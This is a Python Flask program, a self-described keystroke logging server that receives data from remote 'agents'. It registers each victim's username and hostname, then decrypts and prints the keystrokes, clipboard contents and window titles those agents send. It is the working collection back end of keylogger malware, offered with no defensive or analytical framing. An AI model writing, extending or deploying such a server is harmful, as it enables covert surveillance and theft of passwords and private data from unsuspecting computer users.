#!/usr/bin/env python3
"""Keystroke Logging Server - Receives encrypted agent data"""

from flask import Flask, request, jsonify
from Crypto.Cipher import AES
from datetime import datetime
import base64, logging

app = Flask(__name__)
logging.getLogger('werkzeug').setLevel(logging.ERROR)

agents = {}

def decrypt(ciphertext, key):
    aes_key = key.encode().ljust(16, b'\x00')[:16]
    cipher = AES.new(aes_key, AES.MODE_ECB)
    plain = cipher.decrypt(ciphertext)
    pad = plain[-1]
    return plain[:-pad].decode(errors='replace') if 1 <= pad <= 16 else plain.decode(errors='replace')

@app.route('/api/info', methods=['POST'])
def receive_info():
    data = request.get_data().decode(errors='replace')
    user = host = None
    
    for line in data.splitlines():
        if line.startswith('User:'):
            user = line.split(':', 1)[1].strip()
        elif line.startswith('Host:'):
            host = line.split(':', 1)[1].strip()
    
    agents[request.remote_addr] = {'user': user, 'host': host, 'key': user or 'unknown'}
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] ✓ Agent: {user}@{host}")
    return jsonify({'status': 'ok'}), 200

@app.route('/api/data', methods=['POST'])
def receive_data():
    if not agents:
        return jsonify({'status': 'ok'}), 200
    
    ip = request.remote_addr
    if ip not in agents:
        return jsonify({'status': 'ok'}), 200
    
    encoded_data = request.get_data()
    if len(encoded_data) < 1:
        return jsonify({'status': 'ok'}), 200
    
    try:
        data = base64.b64decode(encoded_data)
    except:
        return jsonify({'status': 'ok'}), 200
    
    msg_type, payload = data[0], data[1:]
    key = agents[ip]['key']
    timestamp = datetime.now().strftime('%H:%M:%S')
    
    if msg_type == 0x01:  # Keystrokes/Clipboard/Window
        plain = decrypt(payload, key)
        print(f"[{timestamp}] {plain}")
    
    return jsonify({'status': 'ok'}), 200

if __name__ == '__main__':
    print('╔════════════════════════════╗')
    print('║  LOGGING SERVER - Port 80  ║')
    print('╚════════════════════════════╝\n')
    app.run(host='0.0.0.0', port=80, debug=False, use_reloader=False)
